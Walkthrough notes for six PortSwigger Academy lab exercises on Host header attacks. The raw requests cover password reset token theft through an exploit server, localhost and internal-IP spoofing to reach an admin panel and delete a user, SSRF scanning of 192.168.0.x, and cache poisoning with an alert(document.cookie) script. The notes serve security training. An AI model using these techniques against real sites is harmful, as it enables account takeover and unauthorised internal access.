## [Basic password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)

- Go to the login page and click **"Forgot your password?"**. Submit a reset request for `wiener`.
- Go to the **Exploit Server → Email client**. Open the reset email and note the reset URL — it contains a `temp-forgot-password-token` parameter. Click it and set any new password.
- In Burp Proxy > HTTP history, find the `POST /forgot-password` request. Send it to **Repeater** (`Ctrl+R`).
- In Repeater, change the `Host` header to your exploit server domain:

```
  Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

💡 The server uses the `Host` header to build the reset link in the email — if it trusts it blindly, the link will point to your server instead.

- Keep `username=wiener`, send the request, then check your **Email client** again. Confirm the new reset link now points to your exploit server domain instead of the lab domain.
- Back in Repeater, change `username=carlos` (keep the poisoned `Host` header). Send the request. 💡 Carlos will receive a reset email with a link pointing to your exploit server and will click it automatically.
- Go to **Exploit Server → Access log**. Wait a moment, then look for a `GET /forgot-password?temp-forgot-password-token=...` request — this is Carlos's token. Copy it.
- Go to your **Email client**, copy your original legitimate reset URL, and replace your token with Carlos's stolen token:

```
  https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=CARLOS_TOKEN
```

- Visit that URL, set a new password for Carlos, then log in as `carlos` → lab solved. ✅


## [Host header authentication bypass](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)

- Try visiting `/admin` in the browser. Access is denied, but the error reveals it is only accessible to **local users**.
- In Burp Proxy > HTTP history, find the `GET /admin` request and send it to **Repeater** (`Ctrl+R`).
- In Repeater, change the `Host` header to `localhost` and send the request:

```
  Host: localhost
```

💡 The server uses the `Host` header to determine if the request is coming from a local user — spoofing `localhost` tricks it into granting admin access.

- Confirm you now see the admin panel in the response.
- Change the request line to:

```
  GET /admin/delete?username=carlos
```

- Send the request → carlos is deleted → lab solved. ✅

## [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

- [ ]  Send `GET /` to Repeater, confirm the site validates the Host header (modifying it breaks access)
- [ ]  Add a cache buster param: `GET /?cb=1` — increment it each time you want a fresh back-end response
- [ ]  Add a **second** `Host:` header with a junk value — confirm it's ignored for routing but **reflected** in the script import URL for `/resources/js/tracking.js`
- [ ]  On the exploit server, create `/resources/js/tracking.js` with payload: `alert(document.cookie)` → **Store** it, copy the exploit server domain
- [ ]  Back in Repeater, set the second Host header to your exploit server domain:

```
  Host: YOUR-LAB-ID.web-security-academy.net
  Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

- [ ]  Resend (with cache buster) until you get a **cache hit** containing your exploit server URL in the response
- [ ]  Verify in browser using the same `?cb=X` — confirm `alert()` fires
- [ ]  Remove the cache buster and replay until the cache is poisoned with the clean URL (`GET /`)
- [ ]  Lab solves when the victim hits the poisoned home page ✓

## [Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)

- [ ]  Send `GET /` (200 response) to Repeater. Replace the Host header value with a **Burp Collaborator payload** (right-click → Insert Collaborator payload) and send it
- [ ]  In the **Collaborator** tab, click **Poll now** — confirm you see an HTTP interaction, proving the middleware blindly routes requests based on the Host header
- [ ]  Send that same `GET /` to **Intruder**. In Intruder settings, uncheck **"Update Host header to match target"**
- [ ]  Set the Host header to `192.168.0.§0§` with a payload position on the last octet
- [ ]  In Payloads, set type to **Numbers**, From: `0`, To: `255`, Step: `1` → **Start attack** (ignore the host mismatch warning)
- [ ]  Sort results by **Status** — find the single `302` redirect to `/admin`, send that request to Repeater
- [ ]  In Repeater, change path to `GET /admin` and send — confirm you can access the admin panel
- [ ]  Note the delete form posts to `/admin/delete` with a `csrf` token and `username` param
- [ ]  Change path to `/admin/delete?csrf=<TOKEN_FROM_RESPONSE>&username=carlos`, and copy the `session` cookie from the `Set-Cookie` header into your request
- [ ]  Right-click → **Change request method** to convert to POST → Send
- [ ]  Carlos is deleted, lab solved ✓

## [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)

- [ ]  Send `GET /` to Repeater — confirm that modifying the Host header directly gets you blocked
- [ ]  Switch to an **absolute URL** in the request line instead:

```
  GET https://YOUR-LAB-ID.web-security-academy.net/
```

Now modify the Host header — notice it's no longer blocked, but you get a timeout. This means the absolute URL is being validated, not the Host header

- [ ]  Confirm SSRF: insert a **Burp Collaborator payload** as the Host header value (right-click → Insert Collaborator payload) with the absolute URL still in the request line → send it
- [ ]  **Poll now** in the Collaborator tab — confirm an HTTP interaction comes back, proving you control where the middleware routes requests
- [ ]  Send this request to **Intruder**. Uncheck **"Update Host header to match target"**
- [ ]  Set the Host header to `192.168.0.§0§` with a payload position on the last octet
- [ ]  Payloads → type **Numbers**, From: `0`, To: `255`, Step: `1` → **Start attack**
- [ ]  Sort by **Status** — find the `302` response, send that request to Repeater
- [ ]  In Repeater, change the absolute URL path to `/admin`:

```
  GET https://YOUR-LAB-ID.web-security-academy.net/admin
```

Confirm you have admin panel access

- [ ]  Change the absolute URL path to `/admin/delete?csrf=<TOKEN_FROM_RESPONSE>&username=carlos`, and copy the `session` cookie from the `Set-Cookie` header into your request
- [ ]  Right-click → **Change request method** to convert to POST → Send
- [ ]  Carlos is deleted, lab solved ✓

## [Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)

- [ ]  Send `GET /` to Repeater. Change path to `/admin` and Host to `192.168.0.1` — confirm it just redirects you to the homepage (validation is blocking it)
- [ ]  **Duplicate the tab** so you have two identical tabs, then **add both to a new group** (right-click tab → Add to group → New group)
- [ ]  On **tab 1** (the "legitimate" first request):
    - Path: `GET /`
    - Host: `YOUR-LAB-ID.web-security-academy.net`
    - Add/set `Connection: keep-alive`
- [ ]  On **tab 2** (the smuggled second request):
    - Path: `GET /admin`
    - Host: `192.168.0.1`
- [ ]  Using the dropdown next to **Send**, select **"Send group in sequence (single connection)"** → Send
- [ ]  Check tab 2's response — confirm you now have access to the admin panel (the front-end trusted the connection state after the legitimate first request)
- [ ]  From the admin panel response, note down: the form action (`/admin/delete`), the input name (`username`), and the `csrf` token value
- [ ]  Update **tab 2** to be the delete request:

```
  POST /admin/delete HTTP/1.1
  Host: 192.168.0.1
  Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
  Content-Type: application/x-www-form-urlencoded
  Content-Length: CORRECT

  csrf=YOUR-CSRF-TOKEN&username=carlos
```

- [ ]  Send the group again in sequence over a single connection → lab solved ✓


